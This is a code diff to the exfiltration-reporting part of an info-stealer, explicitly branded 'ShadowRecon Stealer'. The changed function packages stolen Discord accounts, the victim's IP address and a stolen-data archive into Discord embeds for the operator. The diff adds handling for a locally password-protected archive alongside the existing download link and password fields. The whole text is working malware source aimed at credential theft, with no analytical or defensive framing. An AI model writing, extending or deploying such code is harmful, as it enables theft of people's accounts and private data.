@@ -601,9 +601,10 @@ This file indicates that the Discord module found tokens but couldn't process th
      * @param {string} ip - IP address
      * @param {Object} uploadResult - Upload result with download URL and password
      * @param {string} zipPath - Path to ZIP file for direct attachment
+     * @param {string} zipPassword - ZIP password (if password-protected but not uploaded)
      * @returns {Promise<boolean>} Success status
      */
-    async sendAccountEmbeds(accounts, ip = 'Unknown', uploadResult = null, zipPath = '') {
+    async sendAccountEmbeds(accounts, ip = 'Unknown', uploadResult = null, zipPath = '', zipPassword = null) {
         if (accounts.length === 0) {
             logger.info('No Discord accounts to send');
             return true;
@@ -612,29 +613,39 @@ This file indicates that the Discord module found tokens but couldn't process th
         try {
             const embeds = accounts.slice(0, 10).map(account => this.createAccountEmbed(account, ip));
             
-            // Add file information embed if upload result is available
-            if (uploadResult && uploadResult.downloadUrl) {
+            // Add file information embed if upload result is available or if password-protected locally
+            if ((uploadResult && uploadResult.downloadUrl) || zipPassword) {
                 const fileEmbed = {
                     title: ":file_folder: Data Archive",
                     color: 0x7289da,
-                    fields: [
-                        {
-                            name: ":link: Download Link",
-                            value: `[Click here to download](${uploadResult.downloadUrl})`,
-                            inline: false
-                        }
-                    ],
+                    fields: [],
                     footer: {
                         text: "ShadowRecon Stealer - Archive"
                     },
                     timestamp: new Date().toISOString()
                 };
 
-                // Add password field if available
-                if (uploadResult.password) {
+                // Add download link if available
+                if (uploadResult && uploadResult.downloadUrl) {
+                    fileEmbed.fields.push({
+                        name: ":link: Download Link",
+                        value: `[Click here to download](${uploadResult.downloadUrl})`,
+                        inline: false
+                    });
+                } else if (zipPassword) {
+                    fileEmbed.fields.push({
+                        name: ":package: Local Archive",
+                        value: `Archive created locally with password protection`,
+                        inline: false
+                    });
+                }
+
+                // Add password field if available (from upload result or local zip)
+                const password = (uploadResult && uploadResult.password) || zipPassword;
+                if (password) {
                     fileEmbed.fields.push({
                         name: ":key: Archive Password",
-                        value: `\`${uploadResult.password}\``,
+                        value: `\`${password}\``,
                         inline: false
                     });
                     fileEmbed.fields.push({
